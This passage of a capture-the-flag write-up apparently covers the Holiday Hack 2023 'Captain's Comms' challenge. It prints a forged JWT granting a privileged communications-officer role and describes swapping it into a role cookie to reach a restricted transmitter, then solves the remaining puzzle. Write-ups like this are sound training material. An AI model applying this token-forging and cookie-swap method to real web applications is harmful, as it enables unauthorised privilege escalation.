eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng
```

Let's replace our "justWatchThisRole" cookie and try to open the tranmitter. 

Success!

![](/docs/assets/images/comms2.png)

Alright, to transmit a different message it looks like we need a frequency, go-date, and go-time. We do have the frequency from earlier...10426, we just need to determine the others to achieve GLORY!

Let's focus on "Message 2: Audio-Text Decoder" for now. Let's see if we can decode these numbers. 

```
Who For? 
88323 88323 88323 

Message:
12249 12249 16009 16009 12249 12249 16009 16009 
```

We can ignore the who for... knowing we need a date and time I can assume the message is saying 12-24 at 1600 hours. Trying this failed though...

After re-reading the background in the game, I recalled that they want to trick the miscreants to arrive 4 hours earlier. 

Frequency: 10426

Go-date: 1224

Go-time: 1200

Click the trasnmit in the bottom left

GLORY:

![](/docs/assets/images/comms3.png)

---

Ultimate GLORY!

![](/docs/assets/images/win.png)
